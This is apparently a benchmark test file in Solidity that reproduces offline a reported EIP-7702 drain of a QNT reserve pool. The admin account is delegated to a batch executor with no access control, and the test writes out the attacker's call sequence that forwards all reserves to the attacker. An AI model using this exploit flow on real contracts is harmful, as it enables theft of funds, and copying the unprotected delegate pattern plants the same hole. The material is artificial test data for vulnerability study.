// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    MockReserveToken,
    QntReservePool,
    VulnerableBatchExecutorDelegate,
    AdminEoaAccount
} from "../fixtures/eip7702-delegation/b-incident/QntPool7702Clone.sol";

/// @title eip7702-delegation (b) real-incident HOLDOUT: the QNT reserve-pool drain via a
///        7702-delegated ADMIN EOA.
/// @notice Minimized OFFLINE repro (no live RPC) of the 2026-04-28 QNT drain (1,974.546547972979...
///         QNT moved from the reserve pool to the attacker in the pinned tx, ~$124.9K, Ethereum).
///         The pool's admin was an EOA that EIP-7702-delegated its code to a "BatchExecutor" whose
///         batch(address[],bytes[]) entry (selector 0xf38f59d7) was PUBLIC with no access control.
///         Because 7702 makes the admin EOA callable by anyone, the attacker drove the admin's
///         delegated code to call the pool's forwardTransaction(); the pool's address-based admin
///         check (msg.sender == admin) passed, and the reserves were forwarded to the attacker.
///         We model the 7702 "code runs as the account" semantics via delegatecall. The verdict is
///         derived from the real outcome (the pool's reserves end up at the attacker), not hardcoded.
///         HOLDOUT (label=vuln). Facts/sources/on-chain verification: PROVENANCE.md.
contract QntPool7702IncidentTest is Test {
    address constant ATTACKER = address(0xBAD);
    // The exact QNT amount drained from the pool to the attacker in the pinned exploit tx
    // (0xef9994ac...), 18 decimals, as read from the on-chain Transfer log.
    uint256 constant RESERVES = 1974546547972979064297;

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[eip7702-delegation] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_qntPool7702DelegationIncident_isDrained() public {
        // Reserve token + pool funded with the reserves (real pool: 0xdd4f556e..e16a).
        MockReserveToken token = new MockReserveToken();
        AdminEoaAccount admin = new AdminEoaAccount(); // admin EOA: 0xc6ddf907..13f4
        QntReservePool pool = new QntReservePool(address(admin), token);
        token.mint(address(pool), RESERVES);

        // The admin EOA 7702-delegates its code to the unpermissioned batch executor
        // (real BatchExecutor: 0x044dc3e3..057c, batch() selector 0xf38f59d7, no access control).
        VulnerableBatchExecutorDelegate batcher = new VulnerableBatchExecutorDelegate();
        admin.installDelegation(address(batcher));

        // Attacker (real attacker EOA: 0xf5604f65..fa01) drives the admin's delegated code: it calls
        // batch() on the admin, which runs as the admin and calls the pool's privileged
        // forwardTransaction - the pool's admin-by-address check passes, so the reserves are drained.
        address[] memory targets = new address[](1);
        bytes[] memory data = new bytes[](1);
        targets[0] = address(pool);
        data[0] = abi.encodeWithSelector(QntReservePool.forwardTransaction.selector, ATTACKER, RESERVES);

        vm.prank(ATTACKER);
        admin.activate(
            abi.encodeWithSelector(VulnerableBatchExecutorDelegate.batch.selector, targets, data)
        );

        bool drained = token.balanceOf(ATTACKER) == RESERVES && token.balanceOf(address(pool)) == 0;
        _report("qnt-pool-7702-victim", drained);

        assertTrue(drained, "unpermissioned 7702 batch executor on an admin EOA should drain the pool");
        assertEq(token.balanceOf(ATTACKER), RESERVES, "attacker received the full pool reserves");
    }
}
